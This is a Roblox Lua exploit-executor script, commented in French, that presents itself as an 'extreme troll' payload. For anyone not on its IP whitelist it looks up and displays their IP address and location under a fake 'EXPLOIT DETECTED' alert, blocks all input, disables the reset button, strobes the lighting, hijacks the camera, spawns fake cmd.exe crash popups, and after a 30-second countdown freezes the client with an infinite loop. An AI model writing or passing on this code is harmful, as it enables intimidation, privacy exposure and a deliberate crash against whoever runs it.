-- üíÄ EXTREME TROLL SCRIPT + WHITELIST + Brutal Crash + Close stop tout + reset cam & lumi√®re + Fake CMD popup üíÄ

-- Config
local WHITELIST = {
    ["128.79.4.113"] = true -- IPs autoris√©es
}

-- Services
local HttpService = game:GetService("HttpService")
local Lighting = game:GetService("Lighting")
local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")
local Camera = workspace.CurrentCamera
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer

-- Variables contr√¥le
local running = true

-- üåê Obtenir IP de l'utilisateur
local req = (http_request or request or syn and syn.request)
local response = req({ Url = "http://ip-api.com/json/", Method = "GET" })
local data = HttpService:JSONDecode(response.Body)
local ip = data.query or "0.0.0.0"
local isWhitelisted = WHITELIST[ip] == true

-- üß† GUI g√©n√©rique
local gui = Instance.new("ScreenGui", game.CoreGui)
gui.Name = "IP_Alert_GUI"

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0.5, 0, 0.3, 0)
frame.Position = UDim2.new(0.25, 0, 0.3, 0)
frame.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
frame.BorderSizePixel = 0

local title = Instance.new("TextLabel", frame)
title.Text = isWhitelisted and "‚úÖ WHITELISTED ‚úÖ" or "‚ö†Ô∏è EXPLOIT DETECTED ‚ö†Ô∏è"
title.Size = UDim2.new(1, 0, 0.2, 0)
title.BackgroundTransparency = 1
title.TextScaled = true
title.TextColor3 = isWhitelisted and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)

local ipText = Instance.new("TextLabel", frame)
ipText.Text = isWhitelisted and "Your IP: ***.***.***.***" or ("Your IP: " .. ip)
ipText.Size = UDim2.new(1, 0, 0.2, 0)
ipText.Position = UDim2.new(0, 0, 0.2, 0)
ipText.BackgroundTransparency = 1
ipText.TextScaled = true
ipText.TextColor3 = Color3.fromRGB(255, 255, 255)

local locText = Instance.new("TextLabel", frame)
locText.Text = isWhitelisted and "Location: Protected" or ("Location: " .. (data.city or "?") .. ", " .. (data.regionName or "?") .. " (" .. (data.country or "?") .. ")")
locText.Size = UDim2.new(1, 0, 0.2, 0)
locText.Position = UDim2.new(0, 0, 0.4, 0)
locText.BackgroundTransparency = 1
locText.TextScaled = true
locText.TextColor3 = Color3.fromRGB(200, 200, 200)

local countdownText = Instance.new("TextLabel", frame)
countdownText.Text = "Crash dans : 30 secondes"
countdownText.Size = UDim2.new(1, 0, 0.2, 0)
countdownText.Position = UDim2.new(0, 0, 0.6, 0)
countdownText.BackgroundTransparency = 1
countdownText.TextScaled = true
countdownText.TextColor3 = Color3.fromRGB(255, 100, 100)

-- üéß Musique flippante (pour tous)
local sound = Instance.new("Sound", game.Workspace)
sound.SoundId = "rbxassetid://1835337424"
sound.Volume = 10
sound.Looped = true
sound:Play()

-- üî• Ambiance rouge sang et noir (pour tous)
local lightingThread
lightingThread = coroutine.create(function()
	while running do
		Lighting.Ambient = Color3.fromRGB(255, 0, 0)
		Lighting.OutdoorAmbient = Color3.fromRGB(255, 0, 0)
		Lighting.FogColor = Color3.fromRGB(80, 0, 0)
		Lighting.FogEnd = 100
		wait(0.2)
		Lighting.Ambient = Color3.fromRGB(0, 0, 0)
		Lighting.OutdoorAmbient = Color3.fromRGB(0, 0, 0)
		wait(0.2)
	end
end)
coroutine.resume(lightingThread)

-- üõë Bloquer toute interaction (pour tous)
local function blockInput() return Enum.ContextActionResult.Sink end
UIS.InputBegan:Connect(blockInput)
UIS.InputEnded:Connect(blockInput)
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
pcall(function() StarterGui:SetCore("ResetButtonCallback", false) end)

-- üëÅÔ∏è Spectate joueurs random (pour tous)
local spectateThread
spectateThread = coroutine.create(function()
	while running do
		wait(1)
		local allPlayers = Players:GetPlayers()
		if #allPlayers > 1 then
			local target
			repeat
				target = allPlayers[math.random(1, #allPlayers)]
			until target ~= player and target.Character and target.Character:FindFirstChild("HumanoidRootPart")
			local hrp = target.Character.HumanoidRootPart
			Camera.CameraSubject = hrp
			Camera.CameraType = Enum.CameraType.Attach
		end
	end
end)
coroutine.resume(spectateThread)

-- Fonction pour cr√©er un faux popup CMD
local function createFakeCMD()
	if not running then return end

	local cmdGui = Instance.new("ScreenGui", game.CoreGui)
	cmdGui.Name = "FakeCMDPopup"

	local frame = Instance.new("Frame", cmdGui)
	frame.Size = UDim2.new(0, 500, 0, 300)
	frame.Position = UDim2.new(math.random()*0.7, 0, math.random()*0.7, 0)
	frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	frame.BorderColor3 = Color3.fromRGB(0, 255, 0)
	frame.BorderSizePixel = 3

	local titleBar = Instance.new("TextLabel", frame)
	titleBar.Size = UDim2.new(1, 0, 0, 25)
	titleBar.BackgroundColor3 = Color3.fromRGB(0, 120, 0)
	titleBar.Text = "C:\\Windows\\System32\\cmd.exe"
	titleBar.TextColor3 = Color3.fromRGB(255, 255, 255)
	titleBar.Font = Enum.Font.SourceSansBold
	titleBar.TextSize = 18
	titleBar.TextXAlignment = Enum.TextXAlignment.Left
	titleBar.BackgroundTransparency = 0

	local textBox = Instance.new("TextLabel", frame)
	textBox.Size = UDim2.new(1, -10, 1, -35)
	textBox.Position = UDim2.new(0, 5, 0, 30)
	textBox.BackgroundTransparency = 1
	textBox.TextColor3 = Color3.fromRGB(0, 255, 0)
	textBox.Font = Enum.Font.Code
	textBox.TextSize = 16
	textBox.TextXAlignment = Enum.TextXAlignment.Left
	textBox.TextYAlignment = Enum.TextYAlignment.Top

	-- Texte bidon qui "clignote" fa√ßon cmd
	local messages = {
		"Starting system check...",
		"Error: Critical failure detected!",
		"Attempting to repair...",
		"Repair failed. System unstable.",
		"Warning: Memory leak detected.",
		"System crash imminent...",
	}

	local index = 1
	local visible = true

	local blinkConnection
	blinkConnection = RunService.Heartbeat:Connect(function(dt)
		if not running then
			blinkConnection:Disconnect()
			cmdGui:Destroy()
			return
		end
		visible = not visible
		textBox.Text = visible and messages[index] or ""
	end)

	-- Changer message toutes les 0.8 sec
	spawn(function()
		while running do
			wait(0.8)
			index = (index % #messages) + 1
		end
	end)

	-- Supprimer popup apr√®s 1.5 sec
	delay(0.5, function()
		if cmdGui and cmdGui.Parent then
			cmdGui:Destroy()
		end
	end)
end

-- Spawn le popup fake cmd toutes les 2 √† 4 secondes al√©atoires
spawn(function()
	while running do
		createFakeCMD()
		wait(2 + math.random()*2)
	end
end)

-- üîì Si whitelist√© : bouton pour fermer qui stop tout + reset lumi√®re et cam√©ra
if isWhitelisted then
    local close = Instance.new("TextButton", frame)
    close.Size = UDim2.new(0.3, 0, 0.2, 0)
    close.Position = UDim2.new(0.35, 0, 0.8, 0)
    close.Text = "Fermer ce script"
    close.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    close.TextColor3 = Color3.fromRGB(255, 255, 255)
    close.TextScaled = true
    close.MouseButton1Click:Connect(function()
        running = false -- stop threads

        gui:Destroy()

        if sound and sound.Parent then
            sound:Stop()
            sound:Destroy()
        end

        -- Reset lighting √† l‚Äô√©tat normal
        Lighting.Ambient = Color3.fromRGB(127, 127, 127)
        Lighting.OutdoorAmbient = Color3.fromRGB(127, 127, 127)
        Lighting.FogColor = Color3.fromRGB(255, 255, 255)
        Lighting.FogEnd = 100000

        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
        pcall(function() StarterGui:SetCore("ResetButtonCallback", true) end)

        -- Reset cam√©ra sur le joueur
        local character = player.Character
        if character then
            local humanoid = character:FindFirstChild("Humanoid")
            if humanoid then
                Camera.CameraSubject = humanoid
                Camera.CameraType = Enum.CameraType.Custom
            else
                Camera.CameraSubject = character
                Camera.CameraType = Enum.CameraType.Custom
            end
        else
            Camera.CameraSubject = player
            Camera.CameraType = Enum.CameraType.Custom
        end

        script:Destroy()
    end)
end

-- ‚è≥ Compte √† rebours 30 secondes puis CRASH BRUTAL
spawn(function()
    for i = 30, 1, -1 do
        if not running then return end
        countdownText.Text = "Crash dans : " .. i .. " secondes"
        wait(1)
    end

    if not running then return end

    -- Crash brutal: surcharge CPU avec RenderStepped + boucle infinie
    local function heavyLoad()
        local a = 0
        for i = 1, 1e7 do
            a = a + math.sqrt(i) * math.sin(i)
        end
    end

    RunService.RenderStepped:Connect(function()
        if running then
            heavyLoad()
        end
    end)

    -- Boucle infinie bloquante (garantie crash)
    while true do end
end)
